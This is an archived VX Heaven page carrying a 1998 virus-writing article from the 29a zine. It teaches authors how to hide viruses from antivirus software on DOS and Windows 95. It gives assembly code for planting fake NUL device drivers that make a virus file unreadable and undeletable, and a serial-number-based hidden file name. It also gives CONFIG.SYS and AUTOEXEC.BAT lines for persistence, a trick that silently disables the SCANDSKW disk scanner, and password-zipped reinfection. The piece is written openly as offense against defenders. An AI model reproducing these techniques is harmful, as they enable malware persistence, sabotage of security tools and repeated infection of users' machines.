<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> "Q" the Misanthrope 'Playing 'Hide and Seek'' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="&quot;Q&quot; the Misanthrope"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, &quot;Q&quot; the Misanthrope,Playing 'Hide and Seek', autoexec, chain, device, virus, word, drive, hide, list, point, driver, file, standard, copy, format, back"/>
<meta name="Description" content="It is a game of one-up-man-ship between the VX and the AV community. VX seems to be winning this battle but is also forcing new improvements. VX creates virus. AV creates scan strings. VX creates mutation. AV creates smart detectors. VX creates stealth. AV counters that with direct access. VX creates tunneling. AV stops that. VX creates tracing. AV stumbles. VX creates retro. AV stumbles. VX creates Stop AV from memory scanning. AV stumbles. VX creates macro viruses. AV goes nuts. VX creates new places to hide from AV. AV will probably stumble again."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"c16f0d9d4027d3d969215091a171ff5601a4c3c3-1498756972-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vqm02.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Playing 'Hide and Seek'</h1><p><a href="/lib/?lang=en&amp;author=%22Q%22%20the%20Misanthrope"> "Q" the Misanthrope</a><br/> <em><a href="/vx.php?fid=6#f6">29a [2]</a></em><br/> <em>February 1998</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vqm02.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=DO#vqm02">Back to index</a>] [<a href="/lib/vqm02.html#disqus_thread">Comments</a>]<br/> 
<ul>
<li><a href="#p1">Hide in NUL-Space</a></li>
<li><a href="#p2">Hiding in NUL-Space and Windows 95</a></li>
<li><a href="#p3">Hide in Cypher Text</a></li>
</ul>
<p>It is a game of one-up-man-ship between the VX and the AV community. VX seems to be winning this battle but is also forcing new improvements. VX creates virus. AV creates scan strings. VX creates mutation. AV creates smart detectors. VX creates stealth. AV counters that with direct access. VX creates tunneling. AV stops that. VX creates tracing. AV stumbles. VX creates retro. AV stumbles. VX creates Stop AV from memory scanning. AV stumbles. VX creates macro viruses. AV goes nuts. VX creates new places to hide from AV. AV will probably stumble again.</p>
<h2><a name="p1">Hide in NUL-Space</a></h2>
<p>Wouldn't it be great to hide in a file that could not be accessed. You can. There are little things called device drivers in your PC. COM1, COM2, LPT1 and CON are examples. NUL is also a device that serves little purpose except do nothing. An example of this: COPY *.* NUL will read all the files for errors and copy them into NUL-Space (nowhere). Try to create a file by the name of NUL, what could you do with it? An experiment is necessary.</p>
<pre>
c:\>debug
-a
mov ah,52
int 21
int 3

-g
AX=5200 BX=0026 CX=0000 DX=0000 SP=FFEE BP=0000 SI=0000 DI=0000
DS=0C9C ES=00C9 SS=0C9C CS=0C9C IP=0104 NV UP EI PL NZ NA PO NC
0C9C:0104 CC INT 3
-
</pre>
<p>ES:BX points to the DOS list of lists. From Ralf Browns interrupt list:</p>
<p>Format of List of Lists:</p>
<table border="1" cellspacing="0" cellpadding="0" summary="Format of List of Lists">
<tr><th>Offset</th><th>Size</th><th>Description</th></tr>
<tr><td>00h</td><td>DWORD</td><td>pointer to first Drive Parameter Block</td></tr>
<tr><td>04h</td><td>DWORD</td><td>-> first System File Table</td></tr>
<tr><td>08h</td><td>DWORD</td><td>pointer to active CLOCK$ device's header</td></tr>
<tr><td colspan="3">[...]</td></tr>
<tr><td>22h</td><td>18 BYTEs</td><td>actual NUL device driver header (not a pointer!)</td></tr>
</table>
<p>NUL is always the first device on DOS's linked list of device drivers ES:BX+22h is what is of interest. Back to debug.</p>
<pre>
-d es:48l12
00C9:0040 00 00 A6 C9 04 80 C7 0D ........
00C9:0050 CD 0D 4E 55 4C 20 20 20-20 20 ..NUL
</pre>
<p>See the word NUL at es:bx+2Ch. Lets change it to AUTOEXEC.</p>
<pre>
-e es:52 "AUTOEXEC"
-q
</pre>
<p>Back to DOS.</p>
<pre>
c:\>type c:\autoexec.bat

c:\>ren c:\autoexec.bat test.bat
Path not found

c:\>del c:\autoexec.bat
Access denied
</pre>
<p>Notice what happened when AUTOEXEC.BAT was in NUL-Space. It could not be read, renamed or deleted. Wouldn't this be a great way to protect our virus. Ralf Browns list showed that the actual NUL device was only 18 bytes long. Could you just make another 18 byte NUL device by another name? The answer is YES! Here is the device format from Ralf Brown:</p>
<p><strong>Format of DOS device driver header</strong></p>
<table border="1" cellspacing="0" cellpadding="0" summary="Format of DOS device driver header">
<tr><th>Offset </th><th>Size </th><th>Description</th></tr>
<tr><td>00h </td><td>DWORD </td><td>pointer to next driver, offset=FFFFh if last driver</td></tr>
<tr><td>04h </td><td>WORD </td><td>device attributes (see below)
<p><strong>Bitfields for device attributes</strong></p>
<table border="1" cellspacing="0" cellpadding="0" summary="Bitfields for device attributes">
<tr><th>Bit(s)</th><th>Description</th></tr>
<tr><td>15 </td><td>set (indicates character device)</td></tr>
<tr><td>14 </td><td>IOCTL supported</td></tr>
<tr><td>13 </td><td>(DOS 3.0+) output until busy supported</td></tr>
<tr><td>12 </td><td>reserved</td></tr>
<tr><td>11 </td><td>(DOS 3.0+) OPEN/CLOSE/RemMedia calls supported</td></tr>
<tr><td>10-8</td><td>reserved</td></tr>
<tr><td>7 </td><td>(DOS 5.0+) Generic IOCTL check call supported</td></tr>
<tr><td>6 </td><td>(DOS 3.2+) Generic IOCTL call supported</td></tr>
<tr><td>5 </td><td>reserved</td></tr>
<tr><td>4 </td><td>device is special (use INT 29 "fast console output")</td></tr>
<tr><td>3 </td><td>device is CLOCK$</td></tr>
<tr><td>2 </td><td>device is NUL</td></tr>
<tr><td>1 </td><td>device is standard output</td></tr>
<tr><td>0 </td><td>device is standard input</td></tr>
</table>
</td></tr>
<tr><td>06h </td><td>WORD </td><td>device strategy entry point call with ES:BX -> request header</td></tr>
<tr><td>08h </td><td>WORD </td><td>device interrupt entry point</td></tr>
<tr><td>0Ah </td><td>8 BYTEs</td><td>blank-padded character device name</td></tr>
</table>
<p>From the debug experiment:</p>
<pre>
-d es:48l12
00C9:0040 00 00 A6 C9 04 80 C7 0D ........
00C9:0050 CD 0D 4E 55 4C 20 20 20-20 20 ..NUL
</pre>
<p>We see that the next device in the chain is at C9A6:0000h, attributes are 8004h and that the strategy and interrupt entry points are 00C9:0DC7h and 00C9:0DCDh. The strategy and interrupt points for a NUL device just need to point to a RETF (they really could point anywhere since they are not used).</p>
<p>To make our own NUL device we can do something like this:</p>
<pre class="source">
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ->8
 [...]
                 mov     ah,52h          ;get list of lists
                 int     21h
                 cld                     ;get address of next device in ds:si
                 lds     si,dword ptr es:[bx+22h]
                 push    cs              ;point to our device
                 pop     es
                 mov     di,offset virus_device
                 movsw                   ;copy device chain to our device
                 movsw                   ;then hook in our device
                 mov     word ptr ds:[si-02h],cs
                 mov     word ptr ds:[si-04h],offset virus_device
 [...]
 virus_device    dd      -1h
                 dw      8004h           ;NUL character attributes
                 dw      return_far      ;strategy pointer
                 dw      return_far      ;interrupt pointer
                 db      "VIRUS   "      ;any file name your want in NUL-Space
 [...]
 return_far:     retf
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ->8
</pre>
<p>When your virus starts, have your virus create a first generation virus whose host is the standard CD 20 (terminate immediately) before it starts infecting. Name that virus C:\FDGDIKGA.PKB (pseudo random name and extension but should be same for all infections on that PC). This name could be derived from the drive C: serial number:</p>
<pre class="source">
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ->8
 [...]
                 mov     ax,6900h        ;get drive serial number
                 mov     bx,0003h        ;drive C:
                 push    cs
                 pop     ds
                 mov     dx,offset info  ;point to where serial number will be
                 int     21h
 ;create file name from the drive C: serial number
                 cld
                 mov     si,offset serialnumber
                 mov     di,offset device_name
                 mov     cx,0004h        ;loop 4 times
 get_serial:     lodsb                   ;get start of serial number
                 push    cx
                 mov     cl,04h          ;inner loop 4 times
 make_file:      sub     al,cl
                 ror     al,cl           ;pseudo random letter
                 mov     bl,al
                 and     bl,0fh
                 add     bl,"A"          ;create letter from A to P
                 mov     byte ptr ds:[di],bl
                 inc     di              ;save it and move pointer
                 loop    make_file
                 pop     cx
                 loop    get_serial
                 mov     byte ptr ds:[file_dot],"."      ;restore dot
                 mov     byte ptr ds:[asciz_nul],00h     ;restore nul
                 mov     dx,offset file_name
 ;now create virus by name at DS:DX
 [...]
 info            dw      0
 serialnumber    dd      0               ;drive C: serial number
                 db      19 dup(0)       ;misc junk
 file_name       db      "C:"
 device_name     db      "VIRUS000"      ;pseudo virus name goes here
 file_dot        db      ".000"          ;with pseudo extension
 asciz_nul       db      00h,00h,00h
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ->8
</pre>
<p>Hide it with the System and Hidden attribute, maybe even Read-Only. Now create a NUL device by the name of FDGDIKGA (same as pseudo random file name). Add this line to CONFIG.SYS:</p>
<pre>
INSTALL=C:\FDGDIKGA.PKB
</pre>
<p>Now start infecting. Go memory resident (you really only need to have the 18 bytes of your NUL device resident). What will now happen is magic. When the PC reboots there will load a program that doesn't have an executable extension so most AV programs won't even try to scan it. If they do they won't be able to read it or delete it because it is in NUL-Space. The AV people will be able to add the scan string for your virus and remove all the children created by it but they will not get the virus in NUL-Space. It will continue to infect again and again. Maybe only have it infect on Fridays or on the 13th of each month so it will appear that the virus has gone away but later it magically returns.</p>
<h2><a name="p2">Hiding in NUL-Space and Windows 95</a></h2>
<p>It works just fine with one notable exception; SCANDSKW.EXE that is automatically launched by the System Agent detects that there is a device by the same name as a file and will flag it. The solution is simple. Create another NUL device by the name of SCANDSKW. This stops SCANDSKW from working but doesn't flag an error.</p>
<p>Note: when going resident with the 18 byte NUL device, you might want to put it in the same location as the AUX device. This device is never ever used and is just wasting space. AUX is another name for COM1. PRN could be used but some older programs actually use it. LPT3's 18 bytes also could be used. The way to find the AUX device is to search the device chain:</p>
<pre class="source">
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ->8
                 mov     ah,52h                  ;get list of lists
                 int     21h
                 add     bx,22h                  ;point to NUL device
 check_end:      cmp     word ptr es:[bx],-1     ;end of chain?
                 je      end_chain
                 cmp     word ptr es:[bx+0ah],"UA"
                 jne     next_device             ;Look for "AUX "
                 cmp     word ptr es:[bx+0ch]," X"
                 jne     next_device
 [...]
 ;found AUX device at ES:BX change the name at ES:BX+0Ah to whatever you want
 [...]
                 mov     word ptr es:[bx+04h],8004h      ;set NUL device
                 jmp     short end_chain
 next_device:    les     bx,dword ptr es:[bx]    ;get next device in chain
                 jmp     short check_end
 end_chain:
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ->8
</pre>
<p>To see the power of NUL-Space, try this in Windows 95: md"NUL ". It locks the computer completely up.</p>
<h2><a name="p3">Hide in Cypher Text</a></h2>
<p>PkZip has the ability to password protect ZIP files. This can be used to our advantage. Have the virus run this:</p>
<pre>
PKZIP -SPASSWORD C:\VIRUS.ZIP C:\VIRUS.COM
</pre>
<p>And add this to the AUTOEXEC.BAT:</p>
<pre>
@ECHO OFF
PKUNZIP -O -SPASSWORD C:\VIRUS.ZIP
C:\VIRUS.COM
</pre>
<p>This will allow multiple reinfections but the source will not be found with a virus scanner because it will not be able to expand the ZIP file.</p>
<p>If this is over your head, save it and come back to it when you are smarter. Have fun in NUL-Space.</p>
<p>Dear AV community, You are in check!</p>
<p>It is now your move.</p>
<p>"Q" the Misanthrope</p>
[<a style="" href="/lib/?lang=EN&amp;index=DO#vqm02">Back to index</a>] [<a href="/lib/vqm02.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vqm02">de</a><a href="/lib/index.php?lang=en&amp;id=vqm02">en</a><a href="/lib/index.php?lang=es&amp;id=vqm02">es</a><a href="/lib/index.php?lang=it&amp;id=vqm02">it</a><a href="/lib/index.php?lang=fr&amp;id=vqm02">fr</a><a href="/lib/index.php?lang=pl&amp;id=vqm02">pl</a><a href="/lib/index.php?lang=ru&amp;id=vqm02">ru</a><a href="/lib/index.php?lang=ua&amp;id=vqm02">ua</a></div>
</body>
</html>
